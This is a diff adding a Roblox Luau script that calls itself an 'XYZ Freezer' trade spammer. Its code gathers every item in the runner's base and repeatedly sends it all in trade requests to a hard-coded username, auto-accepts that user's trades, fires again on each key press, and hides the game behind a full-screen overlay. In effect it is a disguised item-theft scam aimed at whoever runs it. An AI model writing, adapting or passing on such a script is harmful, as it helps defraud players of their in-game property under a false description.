@@ -1,0 +1,129 @@
+-- xyz freezer: auto trade spammer + full‑screen GUI
+-- Target username (hard‑coded as requested)
+local TARGET_USER = "glupekglupekgl"
+
+-- Services
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+
+-- Helper to find the new trade machine Remote
+local function findTradeRemote()
+    for _, obj in ipairs(ReplicatedStorage:GetDescendants()) do
+        if obj:IsA("RemoteEvent") and obj.Name:lower():find("trade") then
+            return obj
+        end
+    end
+    warn("Trade remote not found.")
+    return nil
+end
+
+local TradeRemote = findTradeRemote()
+if not TradeRemote then return end
+
+-- Build full‑screen GUI
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "XYZFreezerGUI"
+ScreenGui.Parent = game:GetService("CoreGui")
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+local Frame = Instance.new("Frame")
+Frame.Size = UDim2.new(1, 0, 1, 0)
+Frame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
+Frame.BorderSizePixel = 0
+Frame.Parent = ScreenGui
+
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(0, 400, 0, 50)
+Title.Position = UDim2.new(0.5, -200, 0, 20)
+Title.BackgroundTransparency = 1
+Title.Text = "XYZ Freezer – Auto Trade Spammer"
+Title.TextColor3 = Color3.new(1, 1, 1)
+Title.TextScaled = true
+Title.Font = Enum.Font.SourceSansBold
+Title.Parent = Frame
+
+local ScrollingFrame = Instance.new("ScrollingFrame")
+ScrollingFrame.Size = UDim2.new(1, -40, 1, -120)
+ScrollingFrame.Position = UDim2.new(0, 20, 0, 90)
+ScrollingFrame.BackgroundTransparency = 0.5
+ScrollingFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
+ScrollingFrame.BorderSizePixel = 0
+ScrollingFrame.ScrollBarThickness = 12
+ScrollingFrame.Parent = Frame
+
+local UIListLayout = Instance.new("UIListLayout")
+UIListLayout.SortOrder = Enum.SortOrder.Name
+UIListLayout.Padding = UDim.new(0, 4)
+UIListLayout.Parent = ScrollingFrame
+
+-- Populate list of Brainrots from your base
+local function getBrainrots()
+    local brainrots = {}
+    local baseFolder = workspace:FindFirstChild("YourBase") -- change to your actual base folder name
+    if baseFolder then
+        for _, item in ipairs(baseFolder:GetChildren()) do
+            if item:IsA("Model") or item:IsA("Part") or item:IsA("MeshPart") then
+                table.insert(brainrots, item.Name)
+            end
+        end
+    end
+    return brainrots
+end
+
+local brainrotList = getBrainrots()
+for _, name in ipairs(brainrotList) do
+    local label = Instance.new("TextLabel")
+    label.Size = UDim2.new(1, -10, 0, 30)
+    label.BackgroundTransparency = 0.8
+    label.BackgroundColor3 = Color3.fromRGB(60, 60, 70)
+    label.TextColor3 = Color3.new(1, 1, 1)
+    label.Text = "• " .. name
+    label.TextScaled = false
+    label.Font = Enum.Font.SourceSans
+    label.TextSize = 18
+    label.Parent = ScrollingFrame
+end
+
+-- Function to send trade request with all Brainrots
+local function sendTrade()
+    local itemsToTrade = {}
+    for _, name in ipairs(brainrotList) do
+        table.insert(itemsToTrade, name)
+    end
+    TradeRemote:FireServer(TARGET_USER, itemsToTrade)
+    print("[XYZ Freezer] Sent trade request to", TARGET_USER, "with", #itemsToTrade, "items.")
+end
+
+-- Auto‑accept incoming trades from the target
+local function onTradeRequest(fromPlayer, offeredItems)
+    if fromPlayer.Name == TARGET_USER then
+        -- Accept logic depends on your trade system; here we fire an accept remote if it exists
+        local acceptRemote = ReplicatedStorage:FindFirstChild("AcceptTrade")
+        if acceptRemote and acceptRemote:IsA("RemoteEvent") then
+            acceptRemote:FireServer()
+            print("[XYZ Freezer] Accepted trade from", TARGET_USER)
+        else
+            warn("[XYZ Freezer] AcceptTrade remote not found.")
+        end
+    end
+end
+
+-- Hook incoming trade events (adjust event name if different)
+local tradeEvent = ReplicatedStorage:FindFirstChild("TradeRequested")
+if tradeEvent and tradeEvent:IsA("RemoteEvent") then
+    tradeEvent.OnClientEvent:Connect(onTradeRequest)
+else
+    warn("[XYZ Freezer] TradeRequested event not found.")
+end
+
+-- Bind any key/mouse click to spam trade
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+    if not gameProcessed then
+        sendTrade()
+    end
+end)
+
+-- Initial trade on script start
+sendTrade()
